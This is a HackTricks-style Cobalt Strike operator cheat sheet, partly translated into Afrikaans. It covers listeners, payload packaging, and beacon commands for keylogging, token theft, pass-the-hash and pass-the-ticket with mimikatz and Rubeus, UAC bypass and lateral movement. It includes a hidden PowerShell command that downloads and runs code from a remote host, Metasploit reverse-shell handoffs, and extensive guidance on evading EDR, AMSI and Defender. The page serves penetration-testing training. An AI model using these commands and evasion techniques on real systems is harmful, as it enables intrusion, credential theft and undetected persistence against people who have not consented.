# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` then you can select where to listen, which kind of beacon to use (http, dns, smb...) and more.
`Cobalt Strike -> Listeners -> Add/Edit` dan kan jy kies waar om te luister, watter soort beacon om te gebruik (http, dns, smb...) en meer.

### Peer2Peer Listeners

The beacons of these listeners don't need to talk to the C2 directly, they can communicate to it through other beacons.
Die beacons van hierdie listeners hoef nie direk met die C2 te praat nie; hulle kan deur ander beacons daarmee kommunikeer.

`Cobalt Strike -> Listeners -> Add/Edit` then you need to select the TCP or SMB beacons
`Cobalt Strike -> Listeners -> Add/Edit` dan moet jy die TCP- of SMB-beacons kies

* The **TCP beacon will set a listener in the port selected**. To connect to a TCP beacon use the command `connect <ip> <port>` from another beacon
* Die **TCP beacon sal 'n listener op die geselekteerde poort instel**. Om met 'n TCP beacon te koppel, gebruik die opdrag `connect <ip> <port>` vanaf 'n ander beacon

* The **smb beacon will listen in a pipename with the selected name**. To connect to a SMB beacon you need to use the command `link [target] [pipe]`.
* Die **smb beacon sal na 'n pipenaam met die geselekteerde naam luister**. Om met 'n SMB beacon te koppel, gebruik die opdrag `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** for HTA files
* **`HTMLApplication`** vir HTA-lêers
* **`MS Office Macro`** for an office document with a macro
* **`MS Office Macro`** vir 'n office-dokument met 'n macro
* **`Windows Executable`** for a .exe, .dll orr service .exe
* **`Windows Executable`** vir 'n .exe, .dll of service .exe
* **`Windows Executable (S)`** for a **stageless** .exe, .dll or service .exe (better stageless than staged, less IoCs)
* **`Windows Executable (S)`** vir 'n **stageless** .exe, .dll of service .exe (better stageless than staged, minder IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` This will generate a script/executable to download the beacon from cobalt strike in formats such as: bitsadmin, exe, powershell and python
`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Dit sal 'n script/uitvoerbare lêer genereer om die beacon van Cobalt Strike af te laai in formate soos: bitsadmin, exe, powershell en python

#### Host Payloads

If you already has the file you want to host in a web sever just go to `Attacks -> Web Drive-by -> Host File` and select the file to host and web server config.
As jy reeds die lêer het wat jy op 'n webbediener wil aanbied, gaan na `Attacks -> Web Drive-by -> Host File` en kies die lêer om te host en die webbediener-konfigurasie.

### Beacon Options

<details>
<summary>Beacon-opsies en opdragte</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Aangepaste implante / Linux Beacons

- 'n Aangepaste agent hoef slegs die Cobalt Strike Team Server HTTP/S-protokol (default malleable C2 profile) te praat om te registreer/check-in en take te ontvang. Implementeer dieselfde URIs/headers/metadata crypto soos in die profiel gedefinieer sodat die Cobalt Strike UI vir tasking en output hergebruik kan word.
- 'n Aggressor Script (bv., `CustomBeacon.cna`) kan payload-generering vir die non-Windows beacon omsluit sodat operateurs die listener kan kies en ELF-payloads direk vanaf die GUI kan produseer.
- Voorbeelde van Linux task handlers wat aan die Team Server geëmiteer kan word: `sleep`, `cd`, `pwd`, `shell` (exec arbitrary commands), `ls`, `upload`, `download`, en `exit`. Hierdie stem ooreen met task IDs wat deur die Team Server verwag word en moet server-side geïmplementeer word om output in die korrekte formaat terug te gee.
- BOF-ondersteuning op Linux kan bygevoeg word deur Beacon Object Files in-proses te laad met [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (ondersteun ook Outflank-style BOFs), wat modulaire post-exploitation toelaat om binne die implant se konteks/privileges te loop sonder om nuwe prosesse te spawn.
- Embed 'n SOCKS-handler in die custom beacon om pivot-pariteit met Windows Beacons te behou: wanneer die operateur `socks <port>` hardloop, moet die implant 'n plaaslike proxy oopmaak om operateur-toolkits deur die gekompromitteerde Linux-gasheer na interne netwerke te roete.

## Opsec

### Execute-Assembly

Die **`execute-assembly`** gebruik 'n **offerproses** met remote process injection om die aangeduide program uit te voer. Dit is baie luidrugtig aangesien sekere Win APIs gebruik word om binne 'n proses te inject wat elke EDR nagaan. Daar is egter enkele custom tools wat gebruik kan word om iets in dieselfde proses te laai:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- In Cobalt Strike kan jy ook BOF (Beacon Object Files) gebruik: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Die agressor script `https://github.com/outflanknl/HelpColor` sal die `helpx`-opdrag in Cobalt Strike skep wat kleure by opdragte sit om aan te dui of dit BOFs is (groen), Frok&Run (geel) en soortgelyke, of of dit ProcessExecution, injection of soortgelyks is (rooi). Dit help om te weet watter opdragte meer stealthy is.

### Act as the user

Jy kan gebeurtenisse soos `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` nagaan:

- Security EID 4624 - Kontroleer alle interactive logons om die gewone bedryfstye te ken.
- System EID 12,13 - Kontroleer die frekwensie van shutdown/startup/sleep.
- Security EID 4624/4625 - Kontroleer inkomende geldige/ongeldige NTLM-pogings.
- Security EID 4648 - Hierdie gebeurtenis word geskep wanneer plaintext credentials gebruik word om aan te meld. As 'n proses dit gegenereer het, kan die binary moontlik die credentials in clear text in 'n config-lêer of binne die kode hê.

Wanneer jy `jump` vanaf cobalt strike gebruik, is dit beter om die `wmi_msbuild`-metode te gebruik om die nuwe proses meer legitiem te laat lyk.

### Use computer accounts

Dit is algemeen dat verdedigers vreemde gedrag van gebruikers nagaan en dikwels **service accounts en computer accounts soos `*$` van hul monitering uitsluit**. Jy kan hierdie rekeninge gebruik om lateral movement of privilege escalation uit te voer.

### Use stageless payloads

Stageless payloads is minder luidrugtig as staged ones omdat hulle nie 'n tweede fase van die C2-bediener hoef af te laai nie. Dit beteken hulle genereer geen netwerkverkeer ná die aanvanklike verbinding nie, wat dit minder waarskynlik maak om deur netwerkgebaseerde verdediging opgespoor te word.

### Tokens & Token Store

Wees versigtig wanneer jy tokens steel of genereer aangesien dit moontlik is dat 'n EDR alle tokens van alle drade kan enumereer en 'n **token wat aan 'n ander gebruiker** of selfs SYSTEM in die proses behoort, vind.

Dit is handig om tokens **per beacon** te stoor sodat jy nie dieselfde token weer en weer hoef te steel nie. Dit is nuttig vir lateral movement of wanneer jy 'n gesteelde token meerdere kere moet gebruik:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Wanneer jy lateraal beweeg, is dit gewoonlik beter om **'n token te steel as om 'n nuwe een te genereer** of 'n pass the hash-aanval uit te voer.

### Guardrails

Cobalt Strike het 'n funksie genaamd **Guardrails** wat help om die gebruik van sekere opdragte of aksies wat deur verdedigers opgespoor kan word, te blokkeer. Guardrails kan geconfigureer word om spesifieke opdragte te blokkeer, soos `make_token`, `jump`, `remote-exec`, en ander wat algemeen vir lateral movement of privilege escalation gebruik word.

Verder bevat die repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) ook sekere kontroles en idees wat jy kan oorweeg voordat jy 'n payload uitvoer.

### Tickets encryption

In 'n AD wees versigtig met die enkripsie van die tickets. By verstek sal sommige tools RC4-enkripsie vir Kerberos tickets gebruik, wat minder veilig is as AES-enkripsie en moderne omgewings standaard AES sal gebruik. Dit kan deur verdedigers wat vir swak enkripsie-algoritmes monitor opgespoor word.

### Avoid Defaults

Wanneer jy Cobalt Strike gebruik sal die SMB pipes standaard die naam `msagent_####` en `status_####` hê. Verander daardie name. Dit is moontlik om die name van bestaande pipes in Cobalt Strike te kontroleer met die opdrag: `ls \\.\pipe\`

Verder, met SSH-sessies word 'n pipe genaamd `\\.\pipe\postex_ssh_####` geskep. Verander dit met `set ssh_pipename "<new_name>";`.

Ook in postex exploitation-aanvalle kan die pipes `\\.\pipe\postex_####` gemodifiseer word met `set pipename "<new_name>"`.

In Cobalt Strike profiles kan jy ook dinge soos verander:

- Avoiding using `rwx`
- Hoe die process injection gedrag werk (which APIs will be used) in die `process-inject {...}` block
- Hoe die "fork and run" werk in die `post-ex {…}` block
- Die sleep-tyd
- Die maksimum grootte van binaries wat in geheue gelaai mag word
- Die geheue-voetspoor en DLL-inhoud met die `stage {...}` block
- Die netwerkverkeer

### Bypass memory scanning

Sommige EDRs scan geheue vir bekende malware-handtekeninge. Cobalt Strike maak dit moontlik om die `sleep_mask`-funksie as 'n BOF te wysig wat dit in staat stel om die backdoor in geheue te enkripteer.

### Noisy proc injections

Wanneer kode in 'n proses geïnject word, is dit gewoonlik baie luidrugtig, omdat **geen gewone proses gewoonlik hierdie aksie uitvoer nie en die maniere om dit te doen baie beperk is**. Dit kan dus deur gedraggebaseerde detectionsisteme opgespoor word. Verder kan dit ook deur EDRs opgespoor word wat die netwerk skandeer vir **drade wat kode bevat wat nie op skyf is nie** (al gebruik prosesse soos browsers gewoonlik JIT, wat algemeen is). Voorbeeld: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

Wanneer 'n nuwe proses gespawn word, is dit belangrik om 'n **gereelde ouer-kind** verhouding tussen prosesse te handhaaf om detectie te vermy. As svchost.exec iexplorer.exe uitvoer sal dit verdag lyk, aangesien svchost.exe nie 'n normale ouer van iexplorer.exe in 'n gewone Windows-omgewing is nie.

Wanneer 'n nuwe beacon in Cobalt Strike gespawn word, skep dit standaard 'n proses wat **`rundll32.exe`** gebruik om die nuwe listener te laat loop. Dit is nie baie stealthy nie en kan maklik deur EDRs gedetecteer word. Verder word `rundll32.exe` sonder enige args uitgevoer, wat dit nog verdagter maak.

Met die volgende Cobalt Strike-opdrag kan jy 'n ander proses spesifiseer om die nuwe beacon te spawn, en dit minder detecteerbaar maak:
```bash
spawnto x86 svchost.exe
```
Jy kan ook hierdie instelling **`spawnto_x86` and `spawnto_x64`** in 'n profiel verander.

### Proxying attackers traffic

Attackers sal soms in staat moet wees om tools lokaal te laat loop, selfs op linux-machines, en die verkeer van die victims na die tool te laat toe kom (e.g. NTLM relay).

Boonop is dit soms, om 'n pass-the.hash of pass-the-ticket attack uit te voer, stealthier vir die attacker om **add this hash or ticket in his own LSASS process** lokaal te plaas en dan van daar te pivot eerder as om 'n LSASS-proses van 'n victim-masjien te wysig.

Jy moet egter **careful with the generated traffic** wees, aangesien jy moontlik ongewoon verkeer (kerberos?) vanaf jou backdoor process stuur. Hiervoor kan jy pivot na 'n browser process (alhoewel jy dalk gevang kan word as jy jouself in 'n proses inject, so dink aan 'n stealth manier om dit te doen).


### Avoiding AVs

#### AV/AMSI/ETW Bypass

Check the page:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Gewoonlik kan jy in `/opt/cobaltstrike/artifact-kit` die code en pre-compiled templates (in `/src-common`) vind van die payloads wat cobalt strike gaan gebruik om die binary beacons te genereer.

Deur [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) te gebruik met die gegenereerde backdoor (of net met die compiled template) kan jy uitvind wat Defender laat trigger. Dit is gewoonlik 'n string. Dus kan jy net die code wat die backdoor genereer wysig sodat daardie string nie in die finale binary verskyn nie.

Na die wysiging van die code, voer net `./build.sh` uit in dieselfde gids en kopieer die `dist-pipe/` gids na die Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Moet nie vergeet om die aggressiewe script `dist-pipe\artifact.cna` te laai om aan Cobalt Strike aan te dui om die hulpbronne vanaf die skyf te gebruik wat ons wil hê, en nie dié wat reeds gelaai is nie.

#### Resource Kit

Die ResourceKit-lêergids bevat die sjablone vir Cobalt Strike se script-gebaseerde payloads, insluitend PowerShell, VBA en HTA.

Deur [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) saam met die sjablone te gebruik, kan jy uitvind waarna defender (AMSI in hierdie geval) nie hou nie en dit aanpas:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Deur die gedetecteerde reëls te wysig kan jy 'n sjabloon genereer wat nie opgespoor sal word nie.

Moet nie vergeet om die aggressiewe skrip `ResourceKit\resources.cna` te laai om Cobalt Strike te vertel om die hulpbronne vanaf die skyf te gebruik wat ons wil, en nie die reeds gelaaide nie.

#### Function hooks | Syscall

Function hooking is 'n baie algemene metode van ERDs om kwaadwillige aktiwiteit op te spoor. Cobalt Strike laat jou toe om hierdie hooks te omseil deur **syscalls** te gebruik in plaas van die standaard Windows API-aanroepe met die **`None`** config, of die `Nt*`-weergawe van 'n funksie te gebruik met die **`Direct`** instelling, of bloot oor die `Nt*`-funksie te spring met die **`Indirect`** opsie in die malleable profile. Afhangend van die stelsel kan een opsie meer stealth wees as die ander.

Dit kan in die profile gestel word of deur die bevel **`syscall-method`** te gebruik.

Dit kan egter ook lawaaierig wees.

Een opsie wat Cobalt Strike bied om function hooks te omseil, is om daardie hooks te verwyder met: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Jy kan ook nagaan watter funksies ge-hook is met [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) of [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Verskeie Cobalt Strike-opdragte</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## Verwysings

- [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [Unit42 analysis of Cobalt Strike metadata encryption](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [SANS ISC diary on Cobalt Strike traffic](https://isc.sans.edu/diary/27968)
- [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
